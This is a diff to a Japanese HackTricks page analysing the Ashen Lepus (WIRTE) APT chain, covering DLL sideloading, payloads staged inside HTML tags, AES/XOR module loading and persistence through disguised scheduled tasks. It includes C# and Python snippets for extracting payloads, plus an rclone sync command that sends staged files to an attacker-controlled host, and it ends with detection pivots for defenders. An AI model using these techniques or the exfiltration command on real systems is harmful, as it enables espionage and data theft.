@@ -2,23 +2,23 @@
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## 手口の概要
+## トレードクラフトの概要
 
-Ashen Lepus (aka WIRTE) は、DLL sideloading、staged HTML payloads、そしてモジュール式の .NET backdoors を連鎖させて、中東の外交ネットワーク内に持続化する再現可能なパターンを武器化した。この手法は以下に依存するため、任意のオペレーターが再利用可能である:
+Ashen Lepus (aka WIRTE) は、DLL sideloading、staged HTML payloads、モジュール式 .NET backdoors を連鎖させて、中東の外交ネットワーク内に持続的に潜伏する再現可能なパターンを武器化しました。この手法は以下に依存しているため、どのオペレータでも再利用可能です:
 
-- **Archive-based social engineering**: 無害に見えるPDFがターゲットにファイル共有サイトからRARアーカイブを取得するよう指示する。アーカイブには本物に見えるドキュメントビューアのEXE、信頼されたライブラリ名を模した悪意のあるDLL（例: `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`）、およびデコイの `Document.pdf` が同梱されている。
-- **DLL search order abuse**: 被害者がEXEをダブルクリックすると、Windowsは現在のディレクトリからDLLインポートを解決し、悪意あるローダー（AshenLoader）が信頼されたプロセス内で実行され、デコイPDFが開いて疑いを逸らす。
-- **Living-off-the-land staging**: 以降のすべてのステージ（AshenStager → AshenOrchestrator → modules）は必要になるまでディスクに残さず、無害に見えるHTMLレスポンス内に隠された暗号化ブロブとして配信される。
+- **Archive-based social engineering**: 無害に見える PDF がターゲットにファイル共有サイトから RAR アーカイブを取得するよう指示します。アーカイブには、見た目は正規の document viewer EXE、信頼されたライブラリ名を冠した悪性の DLL（例: `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`）、およびデコイの `Document.pdf` が同梱されます。
+- **DLL search order abuse**: 被害者が EXE をダブルクリックすると、Windows はカレントディレクトリから DLL インポートを解決し、malicious loader (AshenLoader) が信頼されたプロセス内で実行される一方、デコイの PDF が開いて疑いを避けます。
+- **Living-off-the-land staging**: 以降のすべてのステージ（AshenStager → AshenOrchestrator → modules）は、必要になるまでディスク上に置かれず、無害に見える HTML レスポンス内に隠された暗号化されたブロブとして配信されます。
 
-## マルチステージ・サイドローディングチェーン
+## Multi-Stage Side-Loading Chain
 
-1. **Decoy EXE → AshenLoader**: EXEはAshenLoaderをサイドロードし、AshenLoaderはホスト情報の収集を行いそれをAES-CTRで暗号化して、`token=`, `id=`, `q=`, `auth=` のようなローテートするパラメータ内に入れて、API風のパス（例: `/api/v2/account`）にPOSTする。
-2. **HTML extraction**: C2はクライアントIPがターゲット地域にジオロケートされ、`User-Agent`がインプラントと一致した場合にのみ次のステージを返し、サンドボックスを困惑させる。チェックを通過するとHTTPボディにはBase64/AES-CTRで暗号化されたAshenStagerペイロードを含む `<headerp>...</headerp>` ブロブが含まれている。
-3. **Second sideload**: AshenStagerは別の正当なバイナリとともに展開され、そのバイナリが `wtsapi32.dll` をインポートする。バイナリに注入された悪意あるコピーはさらにHTMLを取得し、今回は `<article>...</article>` を切り出してAshenOrchestratorを復元する。
-4. **AshenOrchestrator**: Base64エンコードされたJSON設定をデコードするモジュール式の .NET コントローラ。設定の `tg` と `au` フィールドを連結／ハッシュしてAESキーを生成し、それで `xrk` を復号する。得られたバイト列は、その後取得される各モジュールブロブに対するXORキーとして使われる。
-5. **Module delivery**: 各モジュールはHTMLコメントを通じて記述され、パーサを任意のタグへリダイレクトして `<headerp>` や `<article>` のみを探す静的ルールを破る。モジュールには永続化（`PR*`）、アンインストーラ（`UN*`）、偵察（`SN`）、画面キャプチャ（`SCT`）、ファイル探索（`FE`）が含まれる。
+1. **Decoy EXE → AshenLoader**: EXE は AshenLoader を side-load し、ホストのリコンを行い、それを AES-CTR で暗号化して、`token=`, `id=`, `q=`, または `auth=` のような回転するパラメータ内に POST します（例: `/api/v2/account` のような API 風パス）。
+2. **HTML extraction**: C2 はクライアントの IP がターゲット地域にジオロケートされ、`User-Agent` がインプラントと一致した場合にのみ次ステージを明かし、sandboxes を撹乱します。チェックが通ると HTTP ボディに `<headerp>...</headerp>` ブロブが含まれ、そこに Base64/AES-CTR 暗号化された AshenStager ペイロードが入っています。
+3. **Second sideload**: AshenStager は別の正規バイナリとともに展開され、そのバイナリが `wtsapi32.dll` をインポートします。バイナリに注入された悪性コピーはさらに HTML を取得し、今回は `<article>...</article>` を切り出して AshenOrchestrator を復元します。
+4. **AshenOrchestrator**: Base64 エンコードされた JSON config をデコードするモジュラーな .NET コントローラ。config の `tg` と `au` フィールドは連結/ハッシュ化されて AES キーを生成し、それで `xrk` を復号します。得られたバイト列は、その後に取得される各モジュールブロブの XOR キーとして機能します。
+5. **Module delivery**: 各モジュールは HTML コメントで記述され、パーサを任意のタグへリダイレクトして、単に `<headerp>` や `<article>` のみを探す静的ルールを破ります。モジュールには persistence (`PR*`)、uninstallers (`UN*`)、reconnaissance (`SN`)、screen capture (`SCT`)、file exploration (`FE`) などが含まれます。
 
-### HTMLコンテナ解析パターン
+### HTML Container Parsing Pattern
 ```csharp
 var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
 var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
@@ -26,44 +26,61 @@ var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
 var module = XorBytes(aesBytes, xorKey);
 LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
 ```
-たとえ防御側が特定要素をブロックまたは削除しても、オペレータはHTMLコメントで示されたタグを変更するだけで配信を再開できる。
+たとえ防御側が特定の要素をブロックまたは除去しても、オペレーターはHTMLコメントで示されたタグを変更するだけで配信を再開できる。
 
-## Crypto & C2 Hardening
+### クイック抽出ヘルパー (Python)
+```python
+import base64, re, requests
 
-- **AES-CTR everywhere**: current loaders embed 256-bit keys plus nonces (e.g., `{9a 20 51 98 ...}`) and optionally add an XOR layer using strings such as `msasn1.dll` before/after decryption.
-- **Recon smuggling**: 列挙されたデータには高価値アプリを識別するために Program Files の一覧が含まれ、ホストを離れる前に常に暗号化される。
-- **URI churn**: query parameters and REST paths rotate between campaigns (`/api/v1/account?token=` → `/api/v2/account?auth=`), invalidating brittle detections.
-- **Gated delivery**: サーバはジオフェンスされ、実際のインプラントにのみ応答する。未承認クライアントには疑わしくない HTML を返す。
+html = requests.get(url, headers={"User-Agent": ua}).text
+tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
+b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
+blob = base64.b64decode(b64)
+# decrypt blob with AES-CTR, then XOR if required
+```
+## HTML ステージング回避の類似点
 
-## Persistence & Execution Loop
+最近の HTML smuggling に関する研究（Talos）は、HTML 添付ファイル内の `<script>` ブロックに Base64 文字列として隠されたペイロードがあり、実行時に JavaScript によってデコードされることを強調している。同じトリックは C2 応答にも再利用できる: スクリプトタグ（または他の DOM 要素）内に暗号化されたブロブをステージングし、AES/XOR の前にインメモリでデコードすることで、ページを通常の HTML に見せかける。
 
-AshenStager は Windows のメンテナンスジョブを偽装したスケジュールタスクを作成し、`svchost.exe` 経由で実行する。例:
+## 暗号化と C2 の強化
+
+- **AES-CTR everywhere**: 現在の loaders は 256-bit キーと nonce（例 `{9a 20 51 98 ...}`）を埋め込み、暗号化/復号の前後に `msasn1.dll` のような文字列を使った XOR レイヤーを任意で追加する。
+- **Infrastructure split + subdomain camouflage**: staging servers はツールごとに分離され、異なる ASNs にまたがってホスティングされ、正規に見えるサブドメインでフロントされることがあり、あるステージが失われても残りがさらされないようにしている。
+- **Recon smuggling**: 列挙されたデータには高価値アプリを把握するために Program Files の一覧が含まれ、ホストから出る前に常に暗号化される。
+- **URI churn**: クエリパラメータや REST パスがキャンペーンごとに変化し（例 `/api/v1/account?token=` → `/api/v2/account?auth=`）、脆弱な検知を無効化する。
+- **Gated delivery**: サーバーはジオフェンシングされ、本物の implants にのみ応答する。承認されていないクライアントには無害に見える HTML を返す。
+
+## 永続化と実行ループ
+
+AshenStager は Windows のメンテナンスジョブに見せかけたスケジュールタスクを作成し、`svchost.exe` を介して実行される。例：
 
 - `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
 - `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
 - `C:\Windows\System32\Tasks\Automatic Windows Update`
 
-これらのタスクは起動時または間隔でサイドローディングチェーンを再起動し、AshenOrchestrator が再びディスクに触れずに新しいモジュールを要求できるようにする。
+これらのタスクは起動時や定期的に sideloading チェーンを再起動し、AshenOrchestrator がディスクに再度触れずに新しいモジュールを要求できるようにする。
 
-## Using Benign Sync Clients for Exfiltration
+## 無害な同期クライアントを使った Exfiltration
 
-オペレータは専用モジュールを通じて外交文書を `C:\Users\Public`（全ユーザ読み取り可能で目立たない）に配置し、そのディレクトリを攻撃者管理のストレージと同期するために正規の [Rclone](https://rclone.org/) バイナリをダウンロードする:
+オペレーターは専用モジュールを使って外交文書を `C:\Users\Public`（world-readable で目立たない）にステージし、そのディレクトリを攻撃者管理のストレージと同期するために正規の [Rclone](https://rclone.org/) バイナリをダウンロードする。Unit42 は、今回のアクターが exfiltration に Rclone を使用するのを観測したのは初めてであり、正規の同期ツールを悪用して通常トラフィックに紛れるという広い傾向と一致すると指摘している：
 
-1. **Stage**: ターゲットファイルを `C:\Users\Public\{campaign}\` にコピー/収集する。
-2. **Configure**: Rclone の設定を攻撃者管理の HTTPS エンドポイント（例: `api.technology-system[.]com`）を指すように配布する。
-3. **Sync**: `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` を実行し、トラフィックが通常のクラウドバックアップに類似するようにする。
+1. **Stage**: ターゲットのファイルを `C:\Users\Public\{campaign}\` にコピー／収集する。
+2. **Configure**: 攻撃者管理の HTTPS エンドポイント（例 `api.technology-system[.]com`）を指す Rclone の設定を配布する。
+3. **Sync**: `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` を実行して、トラフィックを通常のクラウドバックアップのように見せる。
 
-Rclone は正規のバックアップワークフローで広く使用されているため、防御側は異常な実行（新しいバイナリ、怪しいリモート、または `C:\Users\Public` の突然の同期等）に注目する必要がある。
+Rclone は正規のバックアップワークフローで広く使われているため、防御側は異常な実行（新しいバイナリ、怪しいリモート設定、または `C:\Users\Public` の急な同期など）に注目する必要がある。
 
-## Detection Pivots
+## 検知の着眼点
 
-- Alert on **signed processes** that unexpectedly load DLLs from user-writable paths (Procmon filters + `Get-ProcessMitigation -Module`), especially when the DLL names overlap with `netutils`, `srvcli`, `dwampi`, or `wtsapi32`.
-- Inspect suspicious HTTPS responses for **large Base64 blobs embedded inside unusual tags** or guarded by `<!-- TAG: <xyz> -->` comments.
-- Hunt for **scheduled tasks** that run `svchost.exe` with non-service arguments or point back to dropper directories.
-- Monitor for **Rclone** binaries appearing outside IT-managed locations, new `rclone.conf` files, or sync jobs pulling from staging directories like `C:\Users\Public`.
+- ユーザー書き込み可能なパスから予期せず DLL をロードする **signed processes** にアラートを出す（Procmon フィルタ + `Get-ProcessMitigation -Module`）、特に DLL 名が `netutils`, `srvcli`, `dwampi`, `wtsapi32` と重なる場合。
+- 不審な HTTPS 応答を調査し、**異常なタグ内に埋め込まれた大きな Base64 ブロブ** や `<!-- TAG: <xyz> -->` コメントで保護されたものがないか確認する。
+- HTML のハンティングを拡張し、AES/XOR 処理の前に JavaScript によってデコードされる **`<script>` ブロック内の Base64 文字列**（HTML smuggling スタイルのステージング）を探す。
+- `svchost.exe` をサービス以外の引数で実行する、または dropper ディレクトリを指す **scheduled tasks** を探す。
+- IT 管理下以外の場所に出現する **Rclone** バイナリ、新しい `rclone.conf` ファイル、または `C:\Users\Public` のようなステージングディレクトリからデータを引き出す同期ジョブを監視する。
 
 ## References
 
 - [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
+- [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
 
 {{#include ../../../banners/hacktricks-training.md}}
